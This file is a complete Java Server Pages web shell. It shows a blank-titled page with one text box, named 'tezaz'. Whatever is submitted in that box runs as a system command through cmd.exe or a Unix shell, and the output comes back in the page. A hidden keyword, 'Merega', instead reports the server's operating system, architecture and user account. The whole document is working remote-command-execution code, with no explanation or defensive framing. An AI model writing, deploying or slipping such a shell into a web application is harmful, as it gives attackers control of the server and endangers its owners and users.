<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<% %> 
<HTML>
<BODY> 
<TITLE></TITLE>
<FORM METHOD="POST" NAME="tezaz" ACTION=""><INPUT TYPE="text" style="Width:800px" NAME="tezaz"> <INPUT TYPE="submit" VALUE="Asrut"> </FORM> 
<pre> 
<% 
    String cmd2exec = request.getParameter("tezaz");
    String osName = System.getProperty("os.name" );
    String[] cmd = new String[3];
    try
    {
      if(cmd2exec.contains("Merega"))
      {
        String os = System.getProperty("os.name");
        String arch = System.getProperty("os.arch");
        String username = System.getProperty("user.name");
        out.println("<info>" +  os + " " + arch + " " + username + "</info>");
      }
      else if( osName.toLowerCase().contains("windows"))
      {
        cmd[0] = "cmd.exe";
        cmd[1] = "/C";
        cmd[2] = cmd2exec;
      }
      else if( osName.toLowerCase().contains("linux"))
      {
        cmd[0] = "/bin/bash";
        cmd[1] = "-c";
    	cmd[2] = cmd2exec;
      }
      else
      {
        cmd[0] = "/bin/sh";
        cmd[1] = "-c";
        cmd[2] = cmd2exec;
      }
      Runtime rt = Runtime.getRuntime();
      Process proc = rt.exec(cmd);
      try
      {
        InputStreamReader iser = new InputStreamReader(proc.getErrorStream());
        InputStreamReader isir = new InputStreamReader(proc.getInputStream());
        BufferedReader ber = new BufferedReader(iser);
        BufferedReader bir = new BufferedReader(isir);
        String errline = null;
        String inpline = null;
        while ((inpline = bir.readLine()) != null)
          out.println("<cmd>" + inpline + "</cmd>");
        while ( (errline = ber.readLine()) != null)
          out.println("<cmd>" + errline + "</cmd>");
      }
      catch(IOException ioe)
      {
        ioe.printStackTrace();
      }
      int retcode = proc.waitFor();
      out.println("Return Code: " + retcode);
  } 
  catch (Exception e)
  {
     e.printStackTrace();
  }       
%>
</pre> 
</BODY>
</HTML>
